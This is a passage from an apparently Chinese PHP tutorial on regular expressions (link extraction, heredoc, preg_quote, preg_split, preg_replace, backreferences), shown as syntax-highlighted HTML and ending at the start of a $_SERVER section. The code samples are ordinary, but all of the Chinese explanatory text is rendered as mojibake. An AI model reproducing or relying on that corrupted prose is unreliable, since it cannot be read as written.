class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>é¦–é¡µ<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>category.php?id<span class="token punctuation">=</span>3<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span><span class="token constant">GSM</span>æ‰‹æœº<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>category.php?id<span class="token punctuation">=</span>4<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>åŒæ¨¡æ‰‹æœº<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>category.php?id<span class="token punctuation">=</span>6<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>æ‰‹æœºé…ä»¶<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>group_buy.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>å›¢è´­  å•†å“<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>activity.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>ä¼˜æƒ æ´»åŠ¨<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>snatch.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>å¤ºå®å¥‡å…µ<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>auction.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>æ‹å–æ´»åŠ¨<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exchange.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>ç§¯åˆ†å•†åŸ<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>ç•™è¨€æ¿<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://bbs.ecshop.com/<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span><span class="token constant">EC</span>è®ºå›<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>yfstr<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;table width='900' border='1'>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;tr>&lt;th>åç§°&lt;/th>&lt;th>URLåœ°å€&lt;/th>&lt;th>é“¾æ¥&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ä½¿ç”¨æ­£åˆ™åŒ¹é…</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/&lt;a href=\"(.*?)\".*?>(.*?)&lt;\/a>/s"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"&lt;tr>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$a[2][$k]}&lt;/td>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$a[1][$k]}&lt;/td>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$v}&lt;/td>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;/tr>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"&lt;/table>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨:ä½¿ç”¨<code>&lt;&lt;&lt;</code> è¿™ä¸ªæ˜¯phpå®šç•Œç¬¦</p><p>ä½¿ç”¨æ ¼å¼:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token constant">EOF</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨å®šç•Œç¬¦æ— éœ€ç»™åŒå¼•å·å¢åŠ è½¬ä¹‰å­—ç¬¦,å¯ä»¥å‚è€ƒå¦‚ä¸‹:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"/&lt;div id=\"mainNav\" class=\"clearfix\">/"</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"/&lt;div id="</span>mainNav<span class="token string">" class="</span>clearfix<span class="token string">">/"</span><span class="token punctuation">;</span><span class="token constant">EOF</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4æ­£åˆ™çš„å…¶ä»–å‡½æ•°ä½¿ç”¨"><a href="#4æ­£åˆ™çš„å…¶ä»–å‡½æ•°ä½¿ç”¨" class="headerlink" title="4æ­£åˆ™çš„å…¶ä»–å‡½æ•°ä½¿ç”¨"></a>4æ­£åˆ™çš„å…¶ä»–å‡½æ•°ä½¿ç”¨</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//æ­£åˆ™çš„å…¶ä»–å‡½æ•°ä½¿ç”¨ï¼š</span><span class="token comment" spellcheck="true">//preg_quote -- è½¬ä¹‰æ­£åˆ™è¡¨è¾¾å¼å­—ç¬¦ï¼Œæ­£åˆ™è¡¨è¾¾å¼ç‰¹æ®Šå­—ç¬¦æœ‰ï¼š . \ + * ? [ ^ ] $ ( ) { } = ! </span><span class="token markup">&lt; ></span> <span class="token operator">|</span> <span class="token punctuation">:</span> <span class="token operator">-</span><span class="token comment" spellcheck="true">//preg_split -- ç”¨æ­£åˆ™è¡¨è¾¾å¼åˆ†å‰²å­—ç¬¦ä¸²</span><span class="token comment" spellcheck="true">//preg_replace -- æ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</span><span class="token comment" spellcheck="true">//1.preg_quote -- è½¬ä¹‰æ­£åˆ™è¡¨è¾¾å¼å­—ç¬¦</span><span class="token keyword">echo</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string">"(abc){10}"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åœ¨æ¯ä¸ªå¢åˆ™è¡¨è¾¾å¼è¯­æ³•çš„å­—ç¬¦å‰å¢åŠ ä¸€ä¸ªåæ–œæ </span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string">"a{4}"</span><span class="token punctuation">;</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"werta{4}yu"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//åªæœ‰è¢«è½¬ä¹‰äº†ä»¥åæ‰å¯ä»¥è¢«åŒ¹é…åˆ°</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2. preg_split -- ç”¨æ­£åˆ™è¡¨è¾¾å¼åˆ†å‰²å­—ç¬¦ä¸²</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string">"12,34:56;784;35,67:897:65"</span><span class="token punctuation">;</span><span class="token variable">$list</span> <span class="token operator">=</span> <span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string">"/[,:;]/"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//3. preg_replaceæ‰§è¡Œæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string">"12,34:56;784;35,67:897:65"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//è¦æ±‚å°†ä¸Šé¢çš„:,;éƒ½æ¢æˆç©ºæ ¼</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[,;:]/"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">='</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>aaaaa<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>bbbbb<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>ddddd<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>eeeee<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å°†ä¸Šé¢å­—ä¸²ä¸­æ‰€æœ‰liæ ‡ç­¾ä¸­éƒ½æ·»åŠ ä¸€ä¸ªbæ ‡ç­¾ã€‚</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//echo preg_replace("/&lt;li>(.*?)&lt;\/li>/","&lt;li>&lt;b>\\1&lt;/b>&lt;/li>",$str);</span><span class="token comment" spellcheck="true">//echo preg_replace("/</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">?</span><span class="token punctuation">)</span><span class="token markup">&lt;\/li></span><span class="token operator">/</span><span class="token string">","</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span></span>\<span class="token variable">$1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;li>(.*?)&lt;\/li>/"</span><span class="token punctuation">,</span><span class="token string">'&lt;li>&lt;b>$1&lt;/b>&lt;/li>'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-å­å­˜å‚¨-æ‰©å±•"><a href="#5-å­å­˜å‚¨-æ‰©å±•" class="headerlink" title="5.å­å­˜å‚¨(æ‰©å±•)"></a>5.å­å­˜å‚¨(æ‰©å±•)</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å­å­˜å‚¨ä½¿ç”¨</span><span class="token variable">$date</span><span class="token operator">=</span><span class="token string">"[2012-08-09],[2012,09-19],[2011/08,09],[2012/10/09],[2013,08,01]"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å°†ä¸Šé¢å­—ä¸²ä¸­åˆæ³•çš„æ—¥æœŸåŒ¹é…å‡ºæ¥</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\[[0-9]{4}([\-,\/])[0-9]{2}\\1[0-9]{2}\]/"</span><span class="token punctuation">,</span><span class="token variable">$date</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> "<span class="token operator">&lt;</span>ulstyle<span class="token operator">=</span><span class="token string">'color:red'</span><span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>aaaaa<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>bbbbb<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>ddddd<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>eeeee<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å°†ä¸Šé¢å­—ä¸²ä¸­çš„htmlæ ‡è®°åˆ é™¤æ‰(æ›¿æ¢ç©º)</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;\/?.*?\/?>/s"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="4-åŒ¹é…å…ˆåé¡ºåºï¼š"><a href="#4-åŒ¹é…å…ˆåé¡ºåºï¼š" class="headerlink" title="4.åŒ¹é…å…ˆåé¡ºåºï¼š"></a>4.åŒ¹é…å…ˆåé¡ºåºï¼š</h5><pre><code>å„ç§æ“ä½œç¬¦çš„è¿ç®—ä¼˜å…ˆçº§ ï¼š      ç›¸åŒä¼˜å…ˆçº§çš„ä»å·¦åˆ°å³è¿›è¡Œè¿ç®—ï¼Œä¸åŒä¼˜å…ˆçº§çš„è¿ç®—å…ˆé«˜åä½ã€‚å„ç§æ“ä½œç¬¦çš„ä¼˜å…ˆçº§ä»é«˜åˆ°ä½å¦‚ä¸‹ï¼š   æ“ä½œç¬¦ æè¿°   \ è½¬ä¹‰ç¬¦   (), (?:), (?=), [] åœ†æ‹¬å·å’Œæ–¹æ‹¬å·   *, +, ?, {n}, {n,}, {n,m} é™å®šç¬¦   ^, $, \anymetacharacter ä½ç½®å’Œé¡ºåº   | â€œæˆ–â€æ“ä½œ </code></pre><h4 id="5-å…¶ä»–çš„ç†è§£"><a href="#5-å…¶ä»–çš„ç†è§£" class="headerlink" title="5.å…¶ä»–çš„ç†è§£:"></a><a href="https://blog.csdn.net/qianqian_0825/article/details/88558268?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161572421716780266231984%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=161572421716780266231984&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-88558268.first_rank_v2_pc_rank_v29&utm_term=%2F%28%5B%5Cw%5C-%5D%2B%5C%40%5B%5Cw%5C-%5D%2B%5C.%5B%5Cw%5C-%5D%2B%29%2F" target="_blank" rel="noopener">5.å…¶ä»–çš„ç†è§£:</a></h4><h5 id="1-w-w-w"><a href="#1-w-w-w" class="headerlink" title="1./([\w-]+\@[\w-]+.[\w-]+)/"></a>1./([\w-]+\@[\w-]+.[\w-]+)/</h5><pre><code>[\w\-]+</code></pre><p>è¿™ä¸ªæ˜¯åŒ¹é…äº†å¤šä¸ªèŒƒå›´ä¸ºæ‰€æœ‰çš„å•è¯å­—ç¬¦åŠ ä¸Šæ•°å­—è¿˜æœ‰-çš„å­—ç¬¦ï¼Œï¼Œå¦‚ â€œaaaâ€ â€œ-abâ€ â€œcâ€ â€œs._-lâ€</p><pre><code>\@[\w\-]+</code></pre><p>åŒ¹é…åˆ°@åå†åŒ¹é…@åé¢çš„å¤šä¸ªèŒƒå›´ä¸ºï¼šæ‰€æœ‰çš„å­—ç¬¦+æ•°å­—ï¼Œ-çš„å­—ç¬¦</p><pre><code>\.[\w\-]+</code></pre><p>åŒä¸Š</p><h5 id="2-a-zA-Z"><a href="#2-a-zA-Z" class="headerlink" title="2./^[a-zA-Z ]*$/"></a>2./^[a-zA-Z ]*$/</h5><pre><code>/^$/ :å®Œæ•´è¡¨è¾¾å¼^ :è¡¨ç¤ºä»¥ä»€ä¹ˆå¼€å§‹ï¼Œæˆ–è€…å–å$ :ç»“æŸ^[A-Za-z_] : ä»¥å­—æ¯å¼€å§‹ï¼Œæ— è®ºå¤§å°éƒ½å¯ä»¥ï¼›[^A-Za-z_] :éå­—æ¯å°±å¯ä»¥ï¼›*    é‡å¤0æ¬¡æˆ–æ›´å¤šæ¬¡</code></pre><p>ä¹Ÿå°±æ˜¯å¯¹$nameé‡Œé¢çš„ä¸œè¥¿ï¼Œè¦æ±‚ä»¥å­—æ¯çš„å½¢å¼å¼€å¤´ï¼Œè¿ç»­åŒ¹é…å¤šæ¬¡</p><h5 id="3-b-https-ftp-www-a-z0-9-amp-a-z0-9-amp-i"><a href="#3-b-https-ftp-www-a-z0-9-amp-a-z0-9-amp-i" class="headerlink" title="3./\b(?:(?:https?|ftp):\/\/|www.)[-a-z0-9+&amp;@#\/%?=_|!:,.;]*[-a-z0-9+&amp;@#\/%=_|]/i"></a>3./\b(?:(?:https?|ftp):\/\/|www.)[-a-z0-9+&amp;@#\/%?=<del>_|!:,.;]*[-a-z0-9+&amp;@#\/%=</del>_|]/i</h5><pre><code>\b å­—ç¬¦çš„ä½ç½®æ˜¯éå¸¸é‡è¦çš„ã€‚å¦‚æœå®ƒä½äºè¦åŒ¹é…çš„å­—ç¬¦ä¸²çš„å¼€å§‹ï¼Œå®ƒåœ¨å•è¯çš„å¼€å§‹å¤„æŸ¥æ‰¾åŒ¹é…é¡¹ã€‚å¦‚æœå®ƒä½äºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œå®ƒåœ¨å•è¯çš„ç»“å°¾å¤„æŸ¥æ‰¾åŒ¹é…é¡¹ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢çš„è¡¨è¾¾å¼åŒ¹é…å•è¯ Chapter ä¸­çš„å­—ç¬¦ä¸² terï¼Œå› ä¸ºå®ƒå‡ºç°åœ¨å•è¯è¾¹ç•Œçš„å‰é¢ï¼š/ter\b/</code></pre><h5 id="4-https-ftp-www"><a href="#4-https-ftp-www" class="headerlink" title="4.(?:(?:https?|ftp):\/\/|www.)"></a>4.(?:(?:https?|ftp):\/\/|www.)</h5><pre><code>(?:pattern)    åŒ¹é… pattern ä½†ä¸è·å–åŒ¹é…ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´è¿™æ˜¯ä¸€ä¸ªéè·å–åŒ¹é…ï¼Œä¸è¿›è¡Œå­˜å‚¨ä¾›ä»¥åä½¿ç”¨ã€‚è¿™åœ¨ä½¿ç”¨ &quot;æˆ–&quot; å­—ç¬¦ (|) æ¥ç»„åˆä¸€ä¸ªæ¨¡å¼çš„å„ä¸ªéƒ¨åˆ†æ˜¯å¾ˆæœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œ &#39;industr(?:y|ies) å°±æ˜¯ä¸€ä¸ªæ¯” &#39;industry|industries&#39; æ›´ç®€ç•¥çš„è¡¨è¾¾å¼ã€‚</code></pre><p>è¿™é‡Œå°±æ˜¯å¯¹åé¢çš„è¿›è¡Œâ€œæˆ–â€çš„åŒ¹é…å½¢å¼ï¼Œæ­¤å¤„æ˜¾ç¤ºå¯¹https?ä¸ftpè¿›è¡ŒæŸ¥æ‰¾ï¼Œè¿™ä¸ªç»„åé¢è·Ÿç€å­—ç¬¦ : ï¼Œå®ƒä¼šæŒ‰å­—é¢è¿›è¡ŒåŒ¹é…ï¼Œæ‰¾åˆ°ä»¥åå¯¹https://æˆ–è€…ftp://ä¸www.è¿›è¡Œé€‰æ‹©ï¼Œç»è¿‡è‡ªè¡Œè°ƒè¯•ï¼Œå‘ç°</p><p><a href="https://www" target="_blank" rel="noopener">https://www</a>.</p><p><a href="ftp://www" target="_blank" rel="noopener">ftp://www</a>.</p><p>www.</p><p>è¿™ä¸‰ä¸ªå‡å¯ä»¥</p><pre><code> * åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… &quot;z&quot; ä»¥åŠ &quot;zoo&quot;ã€‚* ç­‰ä»·äº{0,}ã€‚ </code></pre><h1 id="PHPè¶…å…¨å±€å˜é‡-SERVER"><a href="#PHPè¶…å…¨å±€å˜é‡-SERVER" class="headerlink" title="PHPè¶…å…¨å±€å˜é‡$_SERVER"></a>PHPè¶…å…¨å±€å˜é‡$_SERVER</h1><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚ä¸èƒ½ä¿è¯æ¯ä¸ªæœåŠ¡å™¨éƒ½æä¾›å…¨éƒ¨é¡¹ç›®ï¼›æœåŠ¡å™¨å¯èƒ½ä¼šå¿½ç•¥ä¸€äº›ï¼Œæˆ–è€…æä¾›ä¸€äº›æ²¡æœ‰åœ¨è¿™é‡Œåˆ—ä¸¾å‡ºæ¥çš„é¡¹ç›®ã€‚</p><ol><li>$_SERVER[â€˜HTTP_HOSTâ€™] è¯·æ±‚å¤´ä¿¡æ¯ä¸­çš„Hostå†…å®¹ï¼Œè·å–å½“å‰åŸŸåã€‚</li><li>$_SERVER[â€œSERVER_NAMEâ€] 